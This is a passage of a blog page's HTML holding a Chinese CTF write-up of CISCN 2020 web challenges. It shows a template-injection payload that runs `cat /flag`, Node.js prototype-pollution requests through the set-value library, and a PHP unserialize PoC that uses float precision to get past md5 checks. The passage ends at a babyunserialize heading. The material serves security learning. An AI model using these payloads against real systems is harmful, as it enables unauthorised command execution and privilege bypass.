+
+<p>在根目录下面会发现flag文件，用cat读取</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">？a&#x3D;&#123;if:1)echo(&#96;cat &#x2F;flag&#96;);&#x2F;&#x2F;&#125;&#123;end if&#125;</span><br></pre></td></tr></table></figure>
+
+<img src="/2020/08/21/CISCN%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B%E5%88%9D%E8%B5%9B/6.png" class="">
+
+<h2 id="littlegame"><a href="#littlegame" class="headerlink" title="littlegame"></a>littlegame</h2><h3 id="知识点-2"><a href="#知识点-2" class="headerlink" title="知识点"></a>知识点</h3><ul>
+<li>nodejs原生链污染</li>
+<li><code>set-value</code>的原型链污染漏洞</li>
+</ul>
+<h3 id="解题步骤-2"><a href="#解题步骤-2" class="headerlink" title="解题步骤"></a>解题步骤</h3><p>题目给了附件，解压拖到subline里,看了老半天发现只用看下面这两个文件就可以了</p>
+<img src="/2020/08/21/CISCN%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B%E5%88%9D%E8%B5%9B/7.png" class="">
+
+<p>nodejs基本不太会，先找了篇文章看看原型链污染的原理，简单来说就是要利用到<code>__proto__</code>属性，下面是文章里比较重要的部分</p>
+<p>继承的查找过程:</p>
+<p>  调用对象属性时, 会查找属性，如果本身没有，则会去<code>__proto__</code>中查找，也就是构造函数的显式原型中查找，如果构造函数中也没有该属性，因为构造函数也是对象，也有<code>__proto__</code>，那么会去<code>__proto__</code>的显式原型中查找，一直到null</p>
+<p>到这里原理差不多了，下面就是分析了</p>
+<p>在看到<code>const setFn = require(&#39;set-value&#39;);</code>不是很理解，google的时候找到了一篇文章</p>
+<p><a href="https://snyk.io/vuln/SNYK-JS-SETVALUE-450213" target="_blank" rel="noopener">https://snyk.io/vuln/SNYK-JS-SETVALUE-450213</a></p>
+<p>文章里的poc没搞懂到底重写了啥，有没有重写，但是知道的是得从setFn()入手，直接跟进setFn()</p>
+<img src="/2020/08/21/CISCN%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B%E5%88%9D%E8%B5%9B/8.png" class="">
+
+<p>可以看到，这里在访问/Privilege时，可以传入赋值key和value</p>
+<p>下面就是跟进setFn()的第一个参数，这里可以看到session()，在app.js中有下面对Session的参数定义</p>
+<img src="/2020/08/21/CISCN%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B%E5%88%9D%E8%B5%9B/9.png" class="">
+
+<p>这里有env，查一下意思就是环境变量，那么我们要污染的应该就是Session了，session又在环境变量中，这里就是一个重要点，先放着</p>
+<p>下面再来看一下获取flag的条件</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">router.post(<span class="string">"/DeveloperControlPanel"</span>, <span class="function"><span class="keyword">function</span> (<span class="params">req, res, next</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// not implement</span></span><br><span class="line">    <span class="keyword">if</span> (req.body.key === <span class="literal">undefined</span> || req.body.password === <span class="literal">undefined</span>)&#123;</span><br><span class="line">        res.send(<span class="string">"What's your problem?"</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">let</span> key = req.body.key.toString();</span><br><span class="line">        <span class="keyword">let</span> password = req.body.password.toString();</span><br><span class="line">        <span class="keyword">if</span>(Admin[key] === password)&#123;</span><br><span class="line">            res.send(process.env.flag);</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            res.send(<span class="string">"Wrong password!Are you Admin?"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
+
+<p>Admin[key]的值和password的值只要能够相等，就会给到在环境变量中的flag，这里</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> Admin = &#123;</span><br><span class="line">    <span class="string">"password1"</span>:process.env.p1,</span><br><span class="line">    <span class="string">"password2"</span>:process.env.p2,</span><br><span class="line">    <span class="string">"password3"</span>:process.env.p3</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>Admin的定义也是在环境变量中，所以没办法用原型链污染覆盖，用上面分析的往环境变量中写入</p>
+<p>又因为<strong>所有继承object对象原型的实例对象在本身不拥有b属性的情况下，都会拥有b属性，且值为value</strong></p>
+<p>所以我猜测污染session写入环境变量，在判断时找不到Admin中对应的值时会继续向前找，也就是前面提到的session，现在整个思路应该就清晰了，上poc</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;Privilege</span><br><span class="line"></span><br><span class="line">POST：NewAttributeKey&#x3D;__proto__.peguin&amp;NewAttributeValue&#x3D;123</span><br></pre></td></tr></table></figure>
+
+<img src="/2020/08/21/CISCN%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B%E5%88%9D%E8%B5%9B/10.png" class="">
+
+<p>可以看到成功写到了环境变量中，并且会生成新的键值对，我猜测应该是这种格式</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123; __proto__: &#123; peguin: 123 &#125; &#125;</span><br></pre></td></tr></table></figure>
+
+<p>y因为Admin本身没有这个属性，就会去<code>__proto__</code>中查找，所以接下来我们只要去post传参key为peguin，value为123就可以了</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;DeveloperControlPanel</span><br><span class="line"></span><br><span class="line">post：key&#x3D;peguin&amp;password&#x3D;123</span><br></pre></td></tr></table></figure>
+
+<img src="/2020/08/21/CISCN%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B%E5%88%9D%E8%B5%9B/11.png" class="">
+
+<h2 id="Easytrick"><a href="#Easytrick" class="headerlink" title="Easytrick"></a>Easytrick</h2><p>这题没做出来挺遗憾的，赛后复现一点不难，之前接触过的点</p>
+<h3 id="知识点-3"><a href="#知识点-3" class="headerlink" title="知识点"></a>知识点</h3><ul>
+<li>整型和字符串精度问题</li>
+</ul>
+<h3 id="解题步骤-3"><a href="#解题步骤-3" class="headerlink" title="解题步骤"></a>解题步骤</h3><p>开题给源码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">trick</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $trick1;</span><br><span class="line">    <span class="keyword">public</span> $trick2;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;trick1 = (string)<span class="keyword">$this</span>-&gt;trick1;</span><br><span class="line">        <span class="keyword">if</span>(strlen(<span class="keyword">$this</span>-&gt;trick1) &gt; <span class="number">5</span> || strlen(<span class="keyword">$this</span>-&gt;trick2) &gt; <span class="number">5</span>)&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"你太长了"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;trick1 !== <span class="keyword">$this</span>-&gt;trick2 &amp;&amp; md5(<span class="keyword">$this</span>-&gt;trick1) === md5(<span class="keyword">$this</span>-&gt;trick2) &amp;&amp; <span class="keyword">$this</span>-&gt;trick1 != <span class="keyword">$this</span>-&gt;trick2)&#123;</span><br><span class="line">            <span class="keyword">echo</span> file_get_contents(<span class="string">"/flag"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">unserialize($_GET[<span class="string">'trick'</span>]);</span><br></pre></td></tr></table></figure>
+
+<p>这里主要在本地测试，经过测试没有</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$this-&gt;trick1 &#x3D; (string)$this-&gt;trick1;</span><br></pre></td></tr></table></figure>
+
+<p>这里就能用数组直接绕过，问题是多了这一个点，比赛时就没考虑到，赛后突然想到了之前这个考点</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	$a = <span class="number">1.000000000000001</span>;</span><br><span class="line">	$b = <span class="number">1.000000000000001</span>;</span><br><span class="line">	$a = (string)($a);</span><br><span class="line">	<span class="keyword">echo</span> $a;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">'&lt;br /&gt;'</span>;</span><br><span class="line">	<span class="keyword">echo</span> $b;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">'&lt;br /&gt;'</span>;</span><br><span class="line">	<span class="keyword">if</span>(strlen($a)&gt;<span class="number">5</span>||strlen($b)&gt;<span class="number">5</span>)&#123;</span><br><span class="line">		<span class="keyword">die</span>(<span class="string">"you are too long"</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">echo</span> md5($a);</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">'&lt;br /&gt;'</span>;</span><br><span class="line">	<span class="keyword">echo</span> md5($b);</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">'&lt;br /&gt;'</span>;</span><br><span class="line">	<span class="keyword">if</span>($a!==$b&amp;&amp;$a!=$b&amp;&amp;md5($a)==md5($b))&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">"good"</span>;</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">'no'</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>本地测试</p>
+<img src="/2020/08/21/CISCN%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B%E5%88%9D%E8%B5%9B/12.png" class="">
+
+<p>绕过了，直接编poc</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">trick</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $trick1=<span class="number">1.000000000000001</span>;</span><br><span class="line">    <span class="keyword">public</span> $trick2=<span class="number">1.000000000000001</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">$a = <span class="keyword">new</span> trick();</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize($a));</span><br></pre></td></tr></table></figure>
+
+<p>把生成得数据传给trick就可以</p>
+<img src="/2020/08/21/CISCN%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B%E5%88%9D%E8%B5%9B/13.png" class="">
+
+<h2 id="babyunserialize"><a href="#babyunserialize" class="headerlink" title="babyunserialize"></a>babyunserialize</h2><p>知识点</p>
+
+    </div>
+
+    
+    
+    
+        <div class="reward-container">
+  <div></div>
+  <button onclick="var qr = document.getElementById('qr'); qr.style.display = (qr.style.display === 'none') ? 'block' : 'none';">
+    Donate
+  </button>
+  <div id="qr" style="display: none;">
+      
+      <div style="display: inline-block;">
+        <img src="/images/wechatpay.jpg" alt="Peguin WeChat Pay">
+        <p>WeChat Pay</p>
+      </div>
+      
+      <div style="display: inline-block;">
+        <img src="/images/alipay.jpg" alt="Peguin Alipay">
+        <p>Alipay</p>
+      </div>
+
+  </div>
+</div>
+
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>Post author:  </strong>Peguin
+  </li>
+  <li class="post-copyright-link">
+    <strong>Post link: </strong>
+    <a href="http://yoursite.com/2020/08/21/CISCN%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B%E5%88%9D%E8%B5%9B/" title="CISCN全国大学生信息安全竞赛初赛">http://yoursite.com/2020/08/21/CISCN全国大学生信息安全竞赛初赛/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>Copyright Notice:  </strong>All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> unless stating additionally.
+  </li>
+</ul>
+</div>
+
+        
+
+  <div class="followme">
+    <p>Welcome to my other publishing channels</p>
+
+    <div class="social-list">
+
+        <div class="social-item">
+          <a target="_blank" class="social-link" href="/images/2.jpg">
+            <span class="icon">
+              <i class="fab fa-weixin"></i>
+            </span>
+
+            <span class="label">WeChat</span>
+          </a>
+        </div>
+
+        <div class="social-item">
+          <a target="_blank" class="social-link" href="/atom.xml">
+            <span class="icon">
+              <i class="fa fa-rss"></i>
+            </span>
+
+            <span class="label">RSS</span>
+          </a>
+        </div>
+    </div>
+  </div>
+
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/CISCN/" rel="tag"># CISCN</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2020/08/18/NLcommand/" rel="prev" title="NLcommand">
+      <i class="fa fa-chevron-left"></i> NLcommand
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2020/08/27/%E9%92%93%E9%B1%BC%E5%9F%8E%E6%9D%AF/" rel="next" title="钓鱼城杯">
+      钓鱼城杯 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  <div>
+  
+    <div>
+    
+        <div style="text-align:center;color: #ccc;font-size:14px;">-------------本文结束<i class="fa fa-paw"></i>感谢您的阅读-------------</div>
+    
+</div>
+  
+</div>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#前言"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#easyphp"><span class="nav-number">2.</span> <span class="nav-text">easyphp</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#知识点"><span class="nav-number">2.1.</span> <span class="nav-text">知识点</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#解题步骤"><span class="nav-number">2.2.</span> <span class="nav-text">解题步骤</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#RCEME"><span class="nav-number">3.</span> <span class="nav-text">RCEME</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#知识点-1"><span class="nav-number">3.1.</span> <span class="nav-text">知识点</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#解题步骤-1"><span class="nav-number">3.2.</span> <span class="nav-text">解题步骤</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#littlegame"><span class="nav-number">4.</span> <span class="nav-text">littlegame</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#知识点-2"><span class="nav-number">4.1.</span> <span class="nav-text">知识点</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#解题步骤-2"><span class="nav-number">4.2.</span> <span class="nav-text">解题步骤</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Easytrick"><span class="nav-number">5.</span> <span class="nav-text">Easytrick</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#知识点-3"><span class="nav-number">5.1.</span> <span class="nav-text">知识点</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#解题步骤-3"><span class="nav-number">5.2.</span> <span class="nav-text">解题步骤</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#babyunserialize"><span class="nav-number">6.</span> <span class="nav-text">babyunserialize</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Peguin"
+      src="/images/1.jpg">
+  <p class="site-author-name" itemprop="name">Peguin</p>
+  <div class="site-description" itemprop="description">敢于去想，才会有MEteor的光芒闪耀。</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">60</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">33</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/ambitiousleader/" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;ambitiousleader&#x2F;" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="/601209387@qq.com" title="E-Mail → 601209387@qq.com"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://weibo.com/u/6772435317/home?wvr=5&sudaref=graph.qq.com" title="Weibo → https:&#x2F;&#x2F;weibo.com&#x2F;u&#x2F;6772435317&#x2F;home?wvr&#x3D;5&amp;sudaref&#x3D;graph.qq.com" rel="noopener" target="_blank"><i class="fab fa-weibo fa-fw"></i>Weibo</a>
+      </span>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Peguin</span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a>
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  
+  <script color='0,0,0' opacity='0.5' zIndex='-1' count='150' src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  <script src="/lib/anime.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script>
+  <script src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+  <script defer src="/lib/three/three.min.js"></script>
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+
+  
+   <canvas class="fireworks" style="position: fixed;left: 0;top: 0;z-index: 1; pointer-events: none;" ></canvas> 
+   <script type="text/javascript" src="//cdn.bootcss.com/animejs/2.2.0/anime.min.js"></script> 
+   <script type="text/javascript" src="/js/fireworks.js"></script>
+  
+
+
+</body>
+</html>
